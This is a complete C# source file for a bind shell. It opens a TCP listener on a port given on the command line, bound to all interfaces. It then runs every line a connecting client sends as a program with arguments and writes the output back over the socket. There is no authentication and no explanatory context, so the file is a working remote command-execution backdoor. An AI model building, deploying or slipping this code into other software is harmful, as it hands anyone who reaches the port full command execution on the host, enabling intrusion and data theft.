using System;
using System.Net.Sockets;
using System.Net;
using System.Linq;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace bind
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			int port = int.Parse (args [0]);
			TcpListener listener = new TcpListener (IPAddress.Any, port);

			while (true) {

				try {
					listener.Start ();
				} catch {
					return;
				}

				using (NetworkStream stream = new NetworkStream (listener.AcceptSocket ())) {
					using (StreamReader rdr = new StreamReader (stream)) {
						while (true) {
							string cmd = rdr.ReadLine ();

							if (string.IsNullOrEmpty (cmd)) {
								rdr.Close ();
								stream.Close ();
								listener.Stop ();	
								return;
							}

							if (string.IsNullOrWhiteSpace (cmd))
								continue;

							string[] split = cmd.Trim().Split(' ');
							string filename = split.First();
							string arg = string.Join(" ", split.Skip(1));

							try {
								Process prc = new Process ();
								prc.StartInfo = new ProcessStartInfo ();
								prc.StartInfo.FileName = filename;
								prc.StartInfo.Arguments = arg;
								prc.StartInfo.UseShellExecute = false;
								prc.StartInfo.RedirectStandardOutput = true;
								prc.Start ();
								prc.WaitForExit ();

								byte[] results = Encoding.ASCII.GetBytes (prc.StandardOutput.ReadToEnd ());
								stream.Write (results, 0, results.Length);
							} catch{
								string error = "Error running command " + cmd + "\n";
								byte[] errorBytes = Encoding.ASCII.GetBytes (error);
								stream.Write (errorBytes, 0, errorBytes.Length);
							}
						}
					}
				}
			}
		}
	}
}
